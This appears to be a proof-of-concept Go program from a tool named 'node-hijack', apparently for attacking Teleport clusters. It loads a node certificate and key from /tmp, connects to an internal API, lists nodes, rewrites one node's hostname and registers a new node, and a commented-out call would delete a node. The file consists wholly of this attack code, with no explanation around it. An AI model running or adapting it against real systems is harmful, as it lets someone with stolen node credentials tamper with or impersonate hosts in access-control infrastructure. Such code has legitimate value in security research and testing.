package main

import (
	"context"
	"fmt"

	api "xpnsec.com/node-hijack/v2/pkg/api"
)

func main() {
	client, err := api.NewClient("/tmp/node.crt", "/tmp/node.key", "10.1.10.1:8443")
	if err != nil {
		panic(err)
	}

	err = client.GetAllNodes(context.Background())
	if err != nil {
		panic(err)
	}

	node, err := client.GetNode(context.Background(), "58102c12-cf6a-4fd9-b74f-8a6c0e93765f")
	if err != nil {
		panic(err)
	}

	node.Spec.Hostname = "older-one"

	err = client.UpdateNode(context.Background(), node)
	if err != nil {
		panic(err)
	}

	fmt.Printf("%+v\n", node)

	err = client.UpsertNode(context.Background(), "teleport-node-2")
	if err != nil {
		panic(err)
	}

	// time.Sleep(100000)

	// err = client.DeleteNode(context.Background(), "wibble")
	// if err != nil {
	// 	panic(err)
	// }
}
